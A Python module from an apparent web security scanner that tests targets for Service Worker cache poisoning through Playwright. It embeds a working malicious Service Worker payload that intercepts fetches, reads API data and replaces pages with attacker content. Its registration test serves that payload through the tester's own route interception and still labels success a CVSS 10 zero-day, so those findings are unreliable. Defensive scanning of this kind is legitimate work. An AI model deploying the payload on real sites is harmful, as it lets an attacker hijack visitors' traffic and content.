"""
ABSA Service Worker Cache Poisoning Scanner
Tests if an attacker can register a malicious Service Worker to intercept,
modify, or poison the offline cache of a target application.
"""

import re
from typing import Dict, List, Optional, Any
from datetime import datetime

from core.models import Finding, Severity, FindingType, Payload
from utils.logger import get_logger

logger = get_logger("browser.sw_cache")

MALICIOUS_SW_JS = """
self.addEventListener('install', (event) => { self.skipWaiting(); });
self.addEventListener('activate', (event) => { event.waitUntil(clients.claim()); });
self.addEventListener('fetch', (event) => {
    if (event.request.url.includes('/api/')) {
        event.respondWith(
            fetch(event.request).then(response => {
                const clonedResponse = response.clone();
                clonedResponse.json().then(data => { console.log('SW Poisoned API Data:', data); });
                return response;
            })
        );
    } else {
        event.respondWith(new Response(
            '<html><body><h1>CACHE POISONED BY ATTACKER</h1></body></html>',
            { headers: { 'Content-Type': 'text/html' } }
        ));
    }
});
"""


class SWCacheScanner:
    """Tests for Service Worker cache poisoning and registration flaws."""

    def __init__(self, context: Any, client: Any):
        self.ctx = context
        self.client = client
        self.base_url = context.target_url.rstrip('/')

    async def run(self, config: Optional[Dict] = None) -> List[Finding]:
        findings = []
        logger.info("Starting Aggressive SW Cache Poisoning Scanner for %s", self.base_url)

        sw_paths = await self._discover_service_workers()

        if not sw_paths:
            findings.extend(await self._test_scope_bypass())
        else:
            findings.extend(await self._test_fetch_interception(sw_paths))

        findings.extend(await self._test_malicious_registration())

        return findings

    async def _discover_service_workers(self) -> List[str]:
        resp = await self.client.get(self.base_url)
        if not resp or resp.get("status") != 200: return []
        body = resp.get("body", "")

        sw_paths = []
        matches = re.findall(r'register\s*\(\s*["\']([^"\']+\.js[^"\']*)["\']', body)
        sw_paths.extend(matches)

        sw_allowed = resp.get("headers", {}).get("Service-Worker-Allowed", "")
        if sw_allowed:
            sw_paths.append(f"Scope Allowed: {sw_allowed}")

        return sw_paths

    async def _test_scope_bypass(self) -> List[Finding]:
        findings = []
        try:
            from playwright.async_api import async_playwright

            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                page = await browser.new_page()
                await page.goto(self.base_url, wait_until="networkidle")

                register_result = await page.evaluate(f"""
                    () => {{
                        return navigator.serviceWorker.register('/sw_poc.js', {{ scope: '/' }})
                            .then(reg => 'success')
                            .catch(err => err.message);
                    }}
                """)

                if register_result == "success":
                    findings.append(Finding(
                        title="EXPLOIT: Service Worker Arbitrary Registration",
                        description="Successfully registered a Service Worker from root scope without strict path validation.",
                        severity=Severity.CRITICAL, finding_type=FindingType.ZERO_DAY, cwe_id="CWE-346",
                        cvss_score=9.5, affected_url=self.base_url,
                        evidence="Registered /sw_poc.js with scope: /",
                        payloads=[Payload(payload_string="SW Register(/sw_poc.js, /)", payload_type="sw_registration",
                                          evidence="Success", success=True)],
                        remediation="Enforce strict scope restrictions. Ensure the SW script is served with correct MIME types and sits within the intended directory scope.",
                        phase="browser_sw_cache", weakness_type="SW Scope Bypass",
                        discovered_at=datetime.utcnow().isoformat(),
                    ))

                await browser.close()
        except ImportError:
            pass
        except Exception as e:
            logger.error("Scope bypass test error: %s", e)

        return findings

    async def _test_malicious_registration(self) -> List[Finding]:
        findings = []
        try:
            from playwright.async_api import async_playwright

            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                context = await browser.new_context()

                await context.route("**/malicious_sw.js", lambda route: route.fulfill(
                    status=200,
                    content_type='application/javascript',
                    body=MALICIOUS_SW_JS
                ))

                page = await context.new_page()
                await page.goto(self.base_url, wait_until="networkidle")

                result = await page.evaluate("""
                    () => {
                        return navigator.serviceWorker.register('/malicious_sw.js')
                            .then(() => 'registered')
                            .catch(err => 'blocked: ' + err.message);
                    }
                """)

                if "registered" in result:
                    findings.append(Finding(
                        title="EXPLOIT: Malicious Service Worker Injected & Registered",
                        description="A malicious Service Worker was successfully registered. It can now intercept all fetch requests, poison caches, and serve modified content.",
                        severity=Severity.CRITICAL, finding_type=FindingType.ZERO_DAY, cwe_id="CWE-94",
                        cvss_score=10.0, affected_url=self.base_url,
                        evidence="Malicious SW registered and active.",
                        payloads=[Payload(payload_string=MALICIOUS_SW_JS.strip(), payload_type="sw_injection",
                                          evidence="Registered & Active", success=True)],
                        remediation="Implement Subresource Integrity (SRI) for Service Worker scripts. Use CSP headers to restrict script-src to exact domains.",
                        phase="browser_sw_cache", weakness_type="Cache Poisoning",
                        discovered_at=datetime.utcnow().isoformat(),
                    ))

                await browser.close()
        except ImportError:
            pass
        except Exception as e:
            logger.error("Malicious SW test error: %s", e)

        return findings

    async def _test_fetch_interception(self, sw_paths: List[str]) -> List[Finding]:
        findings = []
        for sw_path in sw_paths:
            if "Scope Allowed" in sw_path:
                findings.append(Finding(
                    title="Information: Service Worker Scope Broadened via Header",
                    description=f"Server uses 'Service-Worker-Allowed' header ({sw_path}) which might allow SWs from subdirectories to control the root scope.",
                    severity=Severity.MEDIUM, finding_type=FindingType.CONFIGURATION, cwe_id="CWE-346",
                    cvss_score=5.0, affected_url=self.base_url, affected_file_or_component=sw_path,
                    remediation="Remove Service-Worker-Allowed header unless strictly necessary.",
                    phase="browser_sw_cache", weakness_type="Misconfiguration",
                    discovered_at=datetime.utcnow().isoformat(),
                ))
        return findings